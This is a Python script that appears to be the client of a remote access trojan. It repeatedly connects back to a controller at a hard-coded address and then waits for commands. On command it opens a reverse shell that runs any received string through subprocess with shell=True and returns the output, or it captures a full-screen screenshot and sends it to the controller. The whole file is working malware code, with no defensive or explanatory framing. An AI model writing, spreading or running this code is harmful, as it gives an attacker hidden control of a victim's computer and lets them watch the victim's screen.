import socket
import sys
import os
import time
import subprocess
import mss


address = ("0.0.0.0", 3000)

def take_screen_shot():

    if len(mss.mss().monitors) > 0:
        raw_pixels = mss.mss().grab(mss.mss().monitors[0])
        img_data = mss.tools.to_png(raw_pixels.rgb, raw_pixels.size, 0)
        file_size = str(len(img_data)) + "\n"
        server_con.send(file_size.encode())


        server_con.sendall(img_data)

        del(raw_pixels, img_data)

def send_file(file_path):
    pass

def open_shell():
    while True:
        print("waiting for cmd...")
        data = server_con.recv(1024)
        str_msg = b""

        if data.decode() == "exit":
            break
        elif data.decode()[:2] == "cd":
            dir = data.decode()[3:]
            try:
                os.chdir(dir)
            except FileNotFoundError:
                str_msg = b'No such file or directory: ' + dir.encode()
            else:
                str_msg = os.getcwd().encode()
        elif len(data.decode()) > 0:
            output = subprocess.Popen(f'{data.decode()}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
            str_msg = output[0]
        else:
            str_msg = b"Error!"

        if not str_msg:
            str_msg = b" "

        server_con.sendall(str_msg)



def establish_connection(address):
    global server_con

    print("Connecting...")
    while True:
        try:
            server_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_con.connect((address[0],address[1]))
            print(f"Connected!\nServer: {address[0]}:{address[1]}")
        except:
            time.sleep(1)
        else:
            break


def main():
    establish_connection(address)

    while True:
        choice = server_con.recv(1024).decode()
        if choice == "1":
            print("Opening Shell...")
            open_shell()
        elif choice == "2":
            take_screen_shot()
        elif choice == "6":
            server_con.close()
            establish_connection(address)

    server_con.close()

main()
